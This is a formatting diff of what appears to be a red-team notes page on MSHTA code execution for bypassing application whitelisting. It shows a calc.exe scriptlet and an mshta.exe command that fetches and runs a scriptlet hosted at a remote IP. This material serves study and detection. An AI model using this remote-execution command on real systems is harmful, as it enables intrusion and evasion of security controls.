@@ -8,8 +8,7 @@ description: MSHTA code execution - bypass application whitelisting.
 
 Writing a scriptlet file that will launch calc.exe when invoked:
 
-{% tabs %}
-{% tab title="http://10.0.0.5/m.sct" %}
+{% code title="http://10.0.0.5/m.sct" %}
 ```markup
 <?XML version="1.0"?>
 <scriptlet>
@@ -28,19 +27,16 @@ Writing a scriptlet file that will launch calc.exe when invoked:
 </script>
 </scriptlet>
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Invoking the scriptlet file hosted remotely:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 # from powershell
 /cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## Observations
 
@@ -70,8 +66,7 @@ or by navigating to the file itself, launching it and clicking run:
 
 ![](../../.gitbook/assets/mshta-url.png)
 
-{% tabs %}
-{% tab title="http://10.0.0.5/m.hta" %}
+{% code title="http://10.0.0.5/m.hta" %}
 ```markup
 <html>
 <head>
@@ -88,8 +83,7 @@ RunProgram()
 </body>
 </html>
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## References
 
